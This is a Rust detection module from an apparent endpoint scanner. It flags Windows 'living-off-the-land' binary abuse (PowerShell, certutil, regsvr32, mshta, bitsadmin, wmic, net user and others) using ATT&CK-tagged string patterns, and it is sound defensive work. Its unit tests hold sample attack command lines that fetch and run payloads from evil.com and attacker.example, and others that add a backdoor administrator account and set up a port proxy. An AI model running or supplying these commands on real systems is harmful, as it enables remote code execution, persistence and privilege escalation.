//! LOLBin guard — detect Living-off-the-Land Binary (LOLBin) abuse.
//!
//! "Living-off-the-land" attacks proxy arbitrary code execution through
//! trusted Windows system binaries so signature-based AV sees nothing
//! suspicious in the process image — only the *command-line arguments* betray
//! the attack. This module provides a static registry of every well-documented
//! LOLBin and its malicious invocation patterns, derived from:
//!
//!  * LOLBAS Project (lolbas-project.github.io)
//!  * MITRE ATT&CK T1218 (System Binary Proxy Execution) sub-techniques
//!  * Red Canary Atomic Red Team techniques
//!
//! Usage: pass the lowercased behavioral haystack (already computed by the
//! behavior layer) to [`analyze`]. The function is pure / allocation-light and
//! has no I/O, so it can safely be called in the hot scan path.
//!
//! False-positive discipline (same stance as the heuristic/behavioral layers):
//!  * Every rule requires at least **two** corroborating string indicators,
//!    never a single token that could appear in benign config/documentation.
//!  * OR rules that fire on a single highly-specific token (e.g.
//!    `process call create`) are permitted only when the token is *exclusively*
//!    a malicious invocation pattern — there is no legitimate use of it.

use crate::verdict::{Detection, DetectionKind, Severity};

/// Analyze a pre-lowercased behavioral haystack for LOLBin abuse patterns.
///
/// This is intended to be called *after* the main behavioral analysis (which
/// already contributes `Behavior.Execution.Shell`). These findings are more
/// specific: they name the binary and technique, so SOC analysts get
/// actionable ATT&CK context rather than a generic "shell execution" alert.
pub fn analyze(hay: &str) -> Vec<Detection> {
    let mut out: Vec<Detection> = Vec::new();
    let s = |needle: &str| hay.contains(needle);
    let any = |needles: &[&str]| needles.iter().any(|n| hay.contains(*n));

    // -----------------------------------------------------------------------
    // PowerShell abuse (T1059.001)
    // -----------------------------------------------------------------------
    if s("powershell") {
        // Encoded-command: all variants seen in the wild.
        if any(&["-encodedcommand", "-enc ", " -en ", "-ec "]) {
            push(
                &mut out,
                "LolBin.PowerShell.EncodedCommand",
                "T1059.001",
                Severity::High,
                "PowerShell -EncodedCommand: base64-encoded payload hides script content from logs",
            );
        }
        // Execution policy bypass — used to un-restrict unsigned scripts.
        if s("-executionpolicy bypass")
            || s("-exec bypass")
            || s("-ep bypass")
            || s("set-executionpolicy unrestricted")
        {
            push(
                &mut out,
                "LolBin.PowerShell.ExecutionPolicyBypass",
                "T1059.001",
                Severity::High,
                "PowerShell execution policy bypass: unsigned scripts run without restriction",
            );
        }
        // Download cradles — fetch and run a remote payload in-memory.
        if any(&[
            "downloadstring",
            "downloadfile",
            "invoke-webrequest",
            "webclient",
        ]) && any(&["http://", "https://", "ftp://"])
        {
            push(
                &mut out,
                "LolBin.PowerShell.DownloadCradle",
                "T1105",
                Severity::High,
                "PowerShell download cradle: fetching remote payload directly into memory",
            );
        }
        // IEX / Invoke-Expression: evaluate a string as code — classic obfuscation pivot.
        // Match all common forms: piped (|iex), function-call (iex(), iex ()),
        // chained (&iex), and the full alias (invoke-expression).
        if any(&[
            "iex(",
            "iex (",
            "|iex",
            " iex",
            "&iex",
            "invoke-expression",
            ". (",
        ]) {
            push(
                &mut out,
                "LolBin.PowerShell.InvokeExpression",
                "T1059.001",
                Severity::High,
                "Invoke-Expression: executes arbitrary code from a string — core obfuscation primitive",
            );
        }
        // Reflective / in-memory loading.
        if any(&[
            "[reflection.assembly]::load",
            "system.reflection.assembly",
            "loadfile(",
        ]) {
            push(
                &mut out,
                "LolBin.PowerShell.ReflectiveLoad",
                "T1620",
                Severity::High,
                "PowerShell reflective assembly load: PE loaded from byte array, never touches disk",
            );
        }
        // Hidden / minimised window to conceal execution.
        if s("-windowstyle hidden") || s("-w hidden") {
            push(
                &mut out,
                "LolBin.PowerShell.HiddenWindow",
                "T1564.003",
                Severity::Medium,
                "PowerShell hidden window: conceals a console process from the user desktop",
            );
        }
        // AMSI bypass strings frequently embedded in loaders.
        if any(&[
            "amsicontext",
            "amsiutils",
            "[ref].assembly.gettype('system.management.automation.amsi",
            "patch",
        ]) && s("amsi")
        {
            push(
                &mut out,
                "LolBin.PowerShell.AmsiBypass",
                "T1562.001",
                Severity::High,
                "PowerShell AMSI bypass: disabling the Anti-Malware Scan Interface to avoid detection",
            );
        }
    }

    // -----------------------------------------------------------------------
    // MSHTA — HTML Application host (T1218.005)
    // -----------------------------------------------------------------------
    if s("mshta") {
        if any(&["http://", "https://", "vbscript:", "javascript:"]) {
            push(
                &mut out,
                "LolBin.Mshta.RemoteHta",
                "T1218.005",
                Severity::High,
                "MSHTA executing a remote HTA: trusted Windows host fetching and running arbitrary VBScript/JScript",
            );
        }
        if any(&["\\temp\\", "\\appdata\\", "%temp%"]) {
            push(
                &mut out,
                "LolBin.Mshta.TempDir",
                "T1218.005",
                Severity::Medium,
                "MSHTA running an HTA from a temporary directory — common malware staging pattern",
            );
        }
    }

    // -----------------------------------------------------------------------
    // Certutil — certificate utility (T1140 / T1105)
    // -----------------------------------------------------------------------
    if s("certutil") {
        if s("-urlcache") && any(&["http://", "https://", "-f "]) {
            push(
                &mut out,
                "LolBin.Certutil.UrlDownload",
                "T1105",
                Severity::High,
                "Certutil -urlcache -f: downloading remote files via a trusted certificate utility",
            );
        }
        if s("-decode") || s("-decodehex") {
            push(
                &mut out,
                "LolBin.Certutil.Decode",
                "T1140",
                Severity::High,
                "Certutil -decode: decoding a base64/hex-encoded payload — common stage-2 technique",
            );
        }
        if s("-encode") {
            push(
                &mut out,
                "LolBin.Certutil.Encode",
                "T1027",
                Severity::Medium,
                "Certutil -encode: base64-encoding files — used to exfiltrate or stage payloads",
            );
        }
    }

    // -----------------------------------------------------------------------
    // Regsvr32 — "Squiblydoo" (T1218.010)
    // -----------------------------------------------------------------------
    if s("regsvr32")
        && (any(&["http://", "https://", "ftp://", "\\\\"])
            || (s("/i:") && s("scrobj.dll"))
            || s("scrobj.dll"))
    {
        push(
            &mut out,
            "LolBin.Regsvr32.ComScriptlet",
            "T1218.010",
            Severity::High,
            "Regsvr32 COM scriptlet (Squiblydoo): load and execute a remote .sct script without AppLocker triggering",
        );
    }

    // -----------------------------------------------------------------------
    // Rundll32 — proxy execution via DLL export (T1218.011)
    // -----------------------------------------------------------------------
    if s("rundll32") {
        if any(&["javascript:", "vbscript:"]) {
            push(
                &mut out,
                "LolBin.Rundll32.ScriptExec",
                "T1218.011",
                Severity::High,
                "Rundll32 executing an inline JavaScript/VBScript — unsigned code with no DLL on disk",
            );
        }
        if any(&[
            "advpack.dll,launchinf",
            "ieadvpack.dll,launchinf",
            "syssetup.dll,setupinfsections",
        ]) {
            push(
                &mut out,
                "LolBin.Rundll32.InfExec",
                "T1218.011",
                Severity::High,
                "Rundll32 INF-based execution: running arbitrary commands from a .inf setup file",
            );
        }
        if s("shell32.dll,control_rundll") || s("shell32.dll,shcreatescope") {
            push(
                &mut out,
                "LolBin.Rundll32.Shell32Bypass",
                "T1218.011",
                Severity::High,
                "Rundll32 Shell32 export abuse: loading unsigned code as a Control Panel applet",
            );
        }
    }

    // -----------------------------------------------------------------------
    // BITSAdmin — Background Intelligent Transfer Service (T1197)
    // -----------------------------------------------------------------------
    if s("bitsadmin") {
        if any(&["/transfer", "/addfile", "/create"]) && any(&["http://", "https://", "\\\\"]) {
            push(
                &mut out,
                "LolBin.Bitsadmin.Download",
                "T1197",
                Severity::High,
                "BITSAdmin download job: fetching remote payload via the BITS service — survives reboots",
            );
        }
        if s("/setnotifycmdline") {
            push(
                &mut out,
                "LolBin.Bitsadmin.Persistence",
                "T1197",
                Severity::High,
                "BITSAdmin notify-command: executing a program when a BITS job completes — covert persistence",
            );
        }
    }

    // -----------------------------------------------------------------------
    // MSIExec — remote/silent installer (T1218.007)
    // -----------------------------------------------------------------------
    if s("msiexec")
        && any(&["http://", "https://", "ftp://", "\\\\"])
        && any(&["/q", "/quiet", "/passive"])
    {
        push(
            &mut out,
            "LolBin.Msiexec.RemoteInstall",
            "T1218.007",
            Severity::High,
            "MSIExec silent remote install: downloading and executing a remote MSI package without UI",
        );
    }

    // -----------------------------------------------------------------------
    // InstallUtil — .NET AppLocker bypass (T1218.004)
    // -----------------------------------------------------------------------
    if s("installutil") && (s("/logfile=") || s("/logtoconsole=false") || s("/u ")) {
        push(
            &mut out,
            "LolBin.InstallUtil.AppLockerBypass",
            "T1218.004",
            Severity::High,
            "InstallUtil .NET hosting: executing arbitrary managed code while bypassing software restriction policies",
        );
    }

    // -----------------------------------------------------------------------
    // RegAsm / RegSvcs — .NET proxy execution (T1218.009)
    // -----------------------------------------------------------------------
    if (s("regasm") || s("regsvcs")) && any(&[".dll", "http://", "\\\\"]) {
        push(
            &mut out,
            "LolBin.RegasmRegsvcs",
            "T1218.009",
            Severity::High,
            "RegAsm/RegSvcs: hosting a managed DLL that executes arbitrary code during COM registration",
        );
    }

    // -----------------------------------------------------------------------
    // OdbcConf — DLL execution via response file (T1218.008)
    // -----------------------------------------------------------------------
    if s("odbcconf") && (s("/f ") || s("-f ")) && s(".rsp") {
        push(
            &mut out,
            "LolBin.Odbcconf",
            "T1218.008",
            Severity::High,
            "OdbcConf response file: loading an arbitrary DLL via a .rsp configuration file",
        );
    }

    // -----------------------------------------------------------------------
    // CMSTP — UAC bypass / INF execution (T1218.003)
    // -----------------------------------------------------------------------
    if s("cmstp") && any(&["/ni", "/s", ".inf"]) {
        push(
            &mut out,
            "LolBin.Cmstp",
            "T1218.003",
            Severity::High,
            "CMSTP INF execution: installing a VPN profile that auto-runs commands — common UAC bypass",
        );
    }

    // -----------------------------------------------------------------------
    // WMIC — WMI lateral movement / execution (T1047 / T1021.006)
    // -----------------------------------------------------------------------
    if s("wmic") {
        if s("process call create") {
            push(
                &mut out,
                "LolBin.Wmic.ProcessCreate",
                "T1047",
                Severity::High,
                "WMIC process creation: spawning processes via WMI — bypasses process-parent monitoring",
            );
        }
        if s("/node:") && any(&["process", "os get", "computersystem", "share"]) {
            push(
                &mut out,
                "LolBin.Wmic.RemoteExec",
                "T1021.006",
                Severity::High,
                "WMIC remote node: executing commands on a remote system via WMI — lateral movement",
            );
        }
    }

    // -----------------------------------------------------------------------
    // Netsh port proxy — C2 relay / network pivoting (T1090.001)
    // -----------------------------------------------------------------------
    if s("netsh") && s("portproxy") && any(&["add v4tov4", "add v4tov6", "add v6tov4"]) {
        push(
            &mut out,
            "LolBin.Netsh.PortProxy",
            "T1090.001",
            Severity::High,
            "Netsh port proxy: redirecting network traffic through the endpoint — covert C2 relay",
        );
    }

    // -----------------------------------------------------------------------
    // schtasks — scheduled task persistence (T1053.005)
    // -----------------------------------------------------------------------
    if s("schtasks") && s("/create") {
        if any(&["/sc minute", "/sc hourly", "/sc onstart", "/sc onlogon"]) {
            push(
                &mut out,
                "LolBin.Schtasks.Persistence",
                "T1053.005",
                Severity::Medium,
                "Scheduled task creation at short interval: frequent execution ensures persistence survives reboots",
            );
        }
        if any(&["powershell", "cmd", "mshta", "wscript", "http"]) {
            push(
                &mut out,
                "LolBin.Schtasks.ScriptLaunch",
                "T1053.005",
                Severity::Medium,
                "Scheduled task launching a scripting engine or network command — execution + persistence",
            );
        }
    }

    // -----------------------------------------------------------------------
    // net.exe / net1.exe — account / group manipulation (T1136.001 / T1098)
    // -----------------------------------------------------------------------
    if any(&["net user", "net1 user"]) && any(&["/add", "/active:yes"]) {
        push(
            &mut out,
            "LolBin.Net.UserAdd",
            "T1136.001",
            Severity::High,
            "net user /add: creating a local account — attacker establishing persistence or pivot",
        );
    }
    if any(&["net localgroup", "net1 localgroup"]) && s("administrators") && s("/add") {
        push(
            &mut out,
            "LolBin.Net.PrivilegeEscalation",
            "T1098",
            Severity::High,
            "net localgroup administrators /add: elevating a user to local admin",
        );
    }

    // -----------------------------------------------------------------------
    // DNSCmd — DNS server DLL injection (T1574)
    // -----------------------------------------------------------------------
    if s("dnscmd") && s("/config") && s("/serverlevelplugindll") {
        push(
            &mut out,
            "LolBin.Dnscmd.DllInjection",
            "T1574",
            Severity::High,
            "DNSCmd ServerLevelPluginDLL: injecting an arbitrary DLL into the DNS Server service",
        );
    }

    // -----------------------------------------------------------------------
    // MavInject — process injection stub (T1218)
    // -----------------------------------------------------------------------
    if s("mavinject") && (s("/injectrunning") || s("injectrunning")) {
        push(
            &mut out,
            "LolBin.Mavinject",
            "T1218",
            Severity::High,
            "MavInject /INJECTRUNNING: injecting a DLL into a running process via a signed Microsoft binary",
        );
    }

    // -----------------------------------------------------------------------
    // Forfiles — indirect command execution (T1218)
    // -----------------------------------------------------------------------
    if s("forfiles") && s("/c") && any(&["powershell", "cmd", "mshta", "wscript"]) {
        push(
            &mut out,
            "LolBin.Forfiles",
            "T1218",
            Severity::Medium,
            "Forfiles /C: executing commands via a file-enumeration utility — obscures the actual command",
        );
    }

    // -----------------------------------------------------------------------
    // Pcalua — compatibility assistant (T1218)
    // -----------------------------------------------------------------------
    if s("pcalua") && s("-a") && any(&["http://", "\\\\", ".exe", ".dll"]) {
        push(
            &mut out,
            "LolBin.Pcalua",
            "T1218",
            Severity::Medium,
            "PcaLua -a: executing programs via the Program Compatibility Assistant — proxy execution",
        );
    }

    out
}

fn push(out: &mut Vec<Detection>, name: &str, mitre: &str, severity: Severity, _desc: &str) {
    out.push(Detection {
        name: format!("{name} [{mitre}]"),
        kind: DetectionKind::Behavior,
        severity,
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn lower(s: &str) -> String {
        s.to_ascii_lowercase()
    }

    #[test]
    fn powershell_encoded_command() {
        let hay =
            lower("powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAG0AZA==");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("EncodedCommand")), "{d:?}");
        assert!(
            d.iter().any(|x| x.name.contains("ExecutionPolicyBypass")),
            "{d:?}"
        );
    }

    #[test]
    fn powershell_download_cradle() {
        let hay = lower("powershell -c (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')|iex");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("DownloadCradle")), "{d:?}");
        assert!(
            d.iter().any(|x| x.name.contains("InvokeExpression")),
            "{d:?}"
        );
    }

    #[test]
    fn certutil_urlcache_download() {
        let hay = lower("certutil.exe -urlcache -f http://attacker.example/payload.exe C:\\Windows\\Temp\\p.exe");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("Certutil.UrlDownload")),
            "{d:?}"
        );
    }

    #[test]
    fn regsvr32_squiblydoo() {
        let hay = lower("regsvr32.exe /s /u /i:https://attacker.example/payload.sct scrobj.dll");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("Regsvr32")), "{d:?}");
    }

    #[test]
    fn mshta_remote() {
        let hay = lower("mshta.exe http://attacker.example/payload.hta");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("Mshta.RemoteHta")),
            "{d:?}"
        );
    }

    #[test]
    fn bitsadmin_download_and_persistence() {
        let hay = lower("bitsadmin /create evil & bitsadmin /addfile evil http://attacker.example/p.exe C:\\p.exe & bitsadmin /setnotifycmdline evil C:\\p.exe");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("Bitsadmin.Download")),
            "{d:?}"
        );
        assert!(
            d.iter().any(|x| x.name.contains("Bitsadmin.Persistence")),
            "{d:?}"
        );
    }

    #[test]
    fn wmic_process_create() {
        let hay = lower("wmic process call create \"powershell -enc JABjAG0AZA==\"");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("Wmic.ProcessCreate")),
            "{d:?}"
        );
    }

    #[test]
    fn net_user_add_and_admin() {
        let hay =
            lower("net user backdoor P@ssw0rd /add & net localgroup administrators backdoor /add");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("Net.UserAdd")), "{d:?}");
        assert!(
            d.iter().any(|x| x.name.contains("Net.PrivilegeEscalation")),
            "{d:?}"
        );
    }

    #[test]
    fn netsh_portproxy() {
        let hay = lower("netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.0.2.100 connectport=443");
        let d = analyze(&hay);
        assert!(
            d.iter().any(|x| x.name.contains("Netsh.PortProxy")),
            "{d:?}"
        );
    }

    #[test]
    fn installutil_applocker_bypass() {
        let hay = lower("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U malware.dll");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("InstallUtil")), "{d:?}");
    }

    #[test]
    fn benign_strings_yield_nothing() {
        // A normal cargo build command should not trigger any LOLBin rules.
        let hay = lower("cargo build --release --workspace --locked 2>&1");
        assert!(
            analyze(&hay).is_empty(),
            "false positive on benign cargo command"
        );
    }

    #[test]
    fn schtasks_persistence() {
        let hay =
            lower("schtasks /create /sc minute /mo 5 /tn 'Updater' /tr 'powershell -enc JABj'");
        let d = analyze(&hay);
        assert!(d.iter().any(|x| x.name.contains("Schtasks")), "{d:?}");
    }
}
